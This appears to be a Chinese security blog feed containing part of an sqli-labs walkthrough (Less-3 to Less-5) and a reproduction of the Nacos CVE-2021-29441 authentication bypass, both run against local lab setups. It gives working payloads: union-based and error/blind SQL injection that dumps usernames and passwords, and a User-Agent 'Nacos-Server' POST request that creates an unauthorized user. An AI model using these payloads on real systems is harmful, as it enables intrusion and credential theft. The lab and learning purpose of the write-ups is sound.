&lt;pre tabindex="0" class="chroma">&lt;code class="language-php" data-lang="php">&lt;span class="line">&lt;span class="cl">&lt;span class="o">?&lt;/span>&lt;span class="nx">id&lt;/span>&lt;span class="o">=-&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="err">&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="nx">union&lt;/span> &lt;span class="nx">select&lt;/span> &lt;span class="mi">1&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="nx">group_concat&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">username&lt;/span>&lt;span class="p">),&lt;/span>&lt;span class="nx">group_concat&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">password&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="nx">from&lt;/span> &lt;span class="nx">users&lt;/span> &lt;span class="o">--+&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;strong>爆出所有的用户名和密码&lt;/strong>&lt;br>
&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250313165344.png" alt="Pasted image 20250313165344">&lt;/p>
&lt;h1 id="less-4">Less-4&lt;/h1>
&lt;p>&lt;strong>验证注入点：双引号报错，两个双引号闭合利用闭合方式：&lt;code>&amp;quot;) &amp;lt;payload&amp;gt; --+&lt;/code>&lt;/strong>&lt;br>
也是闭合符号不一样&lt;br>
1.进入第四题，显示&lt;code>Please input the ID as parameter with numeric value&lt;/code>，告诉了我们参数为&lt;strong>id&lt;/strong>&lt;br>
&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250313165443.png" alt="Pasted image 20250313165443">&lt;br>
2.构造&lt;code>?id=1&lt;/code>,页面显示正常&lt;br>
&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250313165519.png" alt="Pasted image 20250313165519">&lt;br>
3.接下来加个双引号，显示语句出错，根据报错信息可以得知参数&lt;code>id&lt;/code>的值被&lt;strong>双引号和括号&lt;/strong>包裹&lt;br>
&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250313165632.png" alt="Pasted image 20250313165632">&lt;br>
4.构造&lt;code>?id=1&amp;quot;) order by 3 --+&lt;/code>通过order by子句来判断该数据表的字段数,页面显示正常&lt;br>
构造&lt;code>?id=1&amp;quot;) order by 4 --+&lt;/code>页面报错，由此可知该表字段数为3&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">http://localhost/sqli-labs/Less-4/?id=1&amp;#34;) order by 3 --+
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250313165810.png" alt="Pasted image 20250313165810">&lt;br>
5.构造&lt;code>?id=-1&amp;quot;) union select 1,2,3 --+&lt;/code>判断出回显点为该&lt;strong>表的第二、三字段&lt;/strong>&lt;br>
&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250313165912.png" alt="Pasted image 20250313165912">&lt;br>
6.构造&lt;code>?id=-1&amp;quot;) union select 1,2,database() --+&lt;/code>知道了&lt;strong>数据库名为security&lt;/strong>&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-php" data-lang="php">&lt;span class="line">&lt;span class="cl">&lt;span class="nx">http&lt;/span>&lt;span class="o">://&lt;/span>&lt;span class="nx">localhost&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">sqli&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="nx">labs&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">Less&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="mi">4&lt;/span>&lt;span class="o">/?&lt;/span>&lt;span class="nx">id&lt;/span>&lt;span class="o">=-&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="s2">&amp;#34;) union select 1,2,database() --+
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>![[Pasted image 20250313170055.png]]&lt;br>
7.构造&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-php" data-lang="php">&lt;span class="line">&lt;span class="cl">&lt;span class="o">?&lt;/span>&lt;span class="nx">id&lt;/span>&lt;span class="o">=-&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="s2">&amp;#34;) union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&amp;#39;security&amp;#39; --+
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>在数据库information_schema中的tables表里查询出security数据库的表有：&lt;strong>emails,referers,uagents,users&lt;/strong>&lt;br>
&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250313170137.png" alt="Pasted image 20250313170137">&lt;br>
8.构造&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">?id=-1&amp;#34;) union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&amp;#39;users&amp;#39; --+
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>在数据库information_schema中的columns里查找出&lt;strong>数据库security中的users表的全部字段&lt;/strong>&lt;br>
&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250313170217.png" alt="Pasted image 20250313170217">&lt;br>
9.构造&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-php" data-lang="php">&lt;span class="line">&lt;span class="cl">&lt;span class="o">?&lt;/span>&lt;span class="nx">id&lt;/span>&lt;span class="o">=-&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="s2">&amp;#34;) union select 1,group_concat(username),group_concat(password) from users --+
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;strong>爆出所有的用户名和密码&lt;/strong>&lt;br>
&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250313170255.png" alt="Pasted image 20250313170255">&lt;/p>
&lt;h1 id="less-5">Less-5&lt;/h1>
&lt;p>&lt;strong>验证注入点：单引号报错，两个单引号闭合利用闭合方式：&lt;code>' &amp;lt;payload&amp;gt; --+&lt;/code>&lt;br>
考察点：报错注入&lt;/strong>&lt;br>
1.进入第五题，显示&lt;code>Please input the ID as parameter with numeric value&lt;/code>，告诉了我们参数为&lt;strong>id&lt;/strong>&lt;br>
&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250313170335.png" alt="Pasted image 20250313170335">&lt;br>
2.构造&lt;code>?id=1&lt;/code>,页面显示&lt;code>You are in...........&lt;/code>，不再像前4题显示&lt;code>name&lt;/code>和&lt;code>passwd&lt;/code>&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">http://localhost/sqli-labs/Less-5/?id=1
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250313170403.png" alt="Pasted image 20250313170403">&lt;br>
3.接下来加个单引号，显示语句出错，根据报错信息可以得知参数&lt;strong>id&lt;/strong>的值被&lt;strong>单引号&lt;/strong>包裹&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">http://localhost/sqli-labs/Less-5/?id=1&amp;#39;
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250313170450.png" alt="Pasted image 20250313170450">&lt;br>
4.构造&lt;code>?id=1‘ order by 1 --+&lt;/code>通过order by子句来判断该数据表的字段数，页面显示正常&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">http://localhost/sqli-labs/Less-5/?id=1&amp;#39; order by 1 --+
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250313170613.png" alt="Pasted image 20250313170613">&lt;br>
构造&lt;code>?id=1' order by 3 --+&lt;/code>页面显示正常&lt;br>
构造&lt;code>?id=1' order by 4 --+&lt;/code>页面报错，由此可知该表&lt;strong>字段数为3&lt;/strong>&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-php" data-lang="php">&lt;span class="line">&lt;span class="cl">&lt;span class="nx">http&lt;/span>&lt;span class="o">://&lt;/span>&lt;span class="nx">localhost&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">sqli&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="nx">labs&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">Less&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="mi">5&lt;/span>&lt;span class="o">/?&lt;/span>&lt;span class="nx">id&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="err">&amp;#39;&lt;/span> &lt;span class="nx">order&lt;/span> &lt;span class="nx">by&lt;/span> &lt;span class="mi">3&lt;/span> &lt;span class="o">--+&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250313170613.png" alt="Pasted image 20250313170613">&lt;br>
5.构造&lt;code>?id=-1' union select 1,2,3 --+&lt;/code>判断回显点，结果发现行不通&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-php" data-lang="php">&lt;span class="line">&lt;span class="cl">&lt;span class="nx">http&lt;/span>&lt;span class="o">://&lt;/span>&lt;span class="nx">localhost&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">sqli&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="nx">labs&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">Less&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="mi">5&lt;/span>&lt;span class="o">/?&lt;/span>&lt;span class="nx">id&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="err">&amp;#39;&lt;/span> &lt;span class="nx">union&lt;/span> &lt;span class="nx">select&lt;/span> &lt;span class="mi">1&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mi">3&lt;/span> &lt;span class="o">--+&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250313170713.png" alt="Pasted image 20250313170713">&lt;br>
6.构造&lt;code>?id=1' and updatexml(1,concat(0x7e,(SELECT version()),0x7e),1) --+&lt;/code>发现可以进行盲注&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-php" data-lang="php">&lt;span class="line">&lt;span class="cl">&lt;span class="nx">http&lt;/span>&lt;span class="o">://&lt;/span>&lt;span class="nx">localhost&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">sqli&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="nx">labs&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">Less&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="mi">5&lt;/span>&lt;span class="o">/?&lt;/span>&lt;span class="nx">id&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="err">&amp;#39;&lt;/span> &lt;span class="k">and&lt;/span> &lt;span class="nx">updatexml&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="nx">concat&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mh">0x7e&lt;/span>&lt;span class="p">,(&lt;/span>&lt;span class="nx">SELECT&lt;/span> &lt;span class="nx">version&lt;/span>&lt;span class="p">()),&lt;/span>&lt;span class="mh">0x7e&lt;/span>&lt;span class="p">),&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="o">--+&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250313171431.png" alt="Pasted image 20250313171431">&lt;br>
7.也可以使用length()来判断数据库名的长度&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-php" data-lang="php">&lt;span class="line">&lt;span class="cl">&lt;span class="nx">http&lt;/span>&lt;span class="o">://&lt;/span>&lt;span class="mf">192.168&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="mf">58.128&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">sqli&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="nx">labs&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">Less&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="mi">5&lt;/span>&lt;span class="o">/?&lt;/span>&lt;span class="nx">id&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="err">&amp;#39;&lt;/span>&lt;span class="k">and&lt;/span> &lt;span class="nx">length&lt;/span>&lt;span class="p">((&lt;/span>&lt;span class="nx">select&lt;/span> &lt;span class="nx">database&lt;/span>&lt;span class="p">()))&lt;/span>&lt;span class="o">&amp;gt;&lt;/span>&lt;span class="mi">7&lt;/span> &lt;span class="o">--+&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250313194135.png" alt="Pasted image 20250313194135">&lt;/p></description></item><item><title>【Nacos】CVE-2021-29441 Nacos 权限认证绕过漏洞</title><link>http://localhost:1313/p/nacoscve-2021-29441-nacos-%E6%9D%83%E9%99%90%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/</link><pubDate>Thu, 28 Aug 2025 00:00:00 +0000</pubDate><guid>http://localhost:1313/p/nacoscve-2021-29441-nacos-%E6%9D%83%E9%99%90%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/</guid><description>&lt;img src="http://localhost:1313/images/15.webp" alt="Featured image of post 【Nacos】CVE-2021-29441 Nacos 权限认证绕过漏洞" />&lt;h1 id="1-漏洞概述">1. 漏洞概述&lt;/h1>
&lt;p>2020年12月29日，Nacos官⽅在github发布的issue中披露Alibaba Nacos 存在⼀个由于不当处理User-Agent导致的未授权访问漏洞 。通过该漏洞，攻击者可以进⾏任意操作，包括&lt;strong>创建新⽤户&lt;/strong>并进⾏登录后操作。&lt;/p>
&lt;h1 id="2-影响版本">2. 影响版本&lt;/h1>
&lt;p>&lt;strong>Nacos &amp;lt;= 2.0.0-ALPHA.1&lt;/strong>&lt;/p>
&lt;h1 id="3-环境搭建">3. 环境搭建&lt;/h1>
&lt;p>&lt;strong>Nacos下载地址(github):&lt;/strong>&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">https: github.com/alibaba/nacos/releases/tag/2.0.0-ALPHA.1
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>Windows搭建：&lt;/p>
&lt;ol>
&lt;li>进入github下载地址后下载版本：&lt;/li>
&lt;/ol>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">nacos-server-2.0.0-ALPHA.1.zip
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;ol start="2">
&lt;li>解压出来后进入bin目录：&lt;/li>
&lt;/ol>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">D:\TargetDrone\nacos-server-2.0.0-ALPHA.1\nacos-server-2.0.0-ALPHA.1\nacos\bin
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;ol start="3">
&lt;li>输入在当前文件夹下使用打开cmd窗口，输入命令：&lt;/li>
&lt;/ol>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">.\startup.cmd -m standalone
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;ol start="4">
&lt;li>然后访问网站：&lt;/li>
&lt;/ol>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">http://192.168.31.134:8848/nacos/
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">192.168.31.134：自己的内网IP地址
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250704214003.png" alt="image.png">&lt;br>
5. 默认账号密码&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl"> nacos/nacos
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>即可。&lt;/p>
&lt;h1 id="4-漏洞复现">4. 漏洞复现&lt;/h1>
&lt;ol>
&lt;li>漏洞路径&lt;/li>
&lt;/ol>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">http: your-ip:8848/nacos/v1/auth/users?pageNo=1&amp;amp;pageSize=1
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250704214308.png" alt="image.png">&lt;br>
2. 虽然有password了, 但是是加盐过的,解密不了，从上图可以发现，⽬前有⼀个⽤户nacos 漏洞利⽤，访问&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">http: your-ip:8848/nacos/v1/auth/users
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250704214433.png" alt="image.png">&lt;br>
PSOT传参：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">username=test1&amp;amp;password=test1
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>UA 头：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl"> Nacos-Server
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>发送POST请求，返回码200，创建⽤户成功~！&lt;br>
&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250705124923.png" alt="image.png">&lt;br>
返回Nacos登录界面：&lt;br>
&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250705125222.png" alt="image.png">&lt;/p>
&lt;p>使用账号/密码：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">test1/test1
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250705125331.png" alt="image.png">&lt;br>
关闭环境：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">./shutdown.sh
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h1 id="5-漏洞分析">5. 漏洞分析&lt;/h1>
&lt;p>Nacos-Server是⽤来进⾏服务间的通信的⽩名单。⽐如服务A要访问服务B，如何知道服务A是服务，只需要在服务A访问服务B的时候UA上写成 Nacos-Server 即可。&lt;br>
正因为这样，所以当我们&lt;strong>UA恶意改为Nacos-Server的时候&lt;/strong>，就会被误以为是服务间的通信，因此在⽩名单当中，绕过的认证。&lt;br>
这⾥⽤的是nacos-2.0.0-ALPHA.1的代码进⾏分析&lt;br>
关键代码在该⽂件下:&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">/nacos-2.0.0-ALPHA.1/naming/src/main/java/com/alibaba/nacos/naming/web/TrafficRevise
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Filter.java
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250705125530.png" alt="image.png">&lt;br>
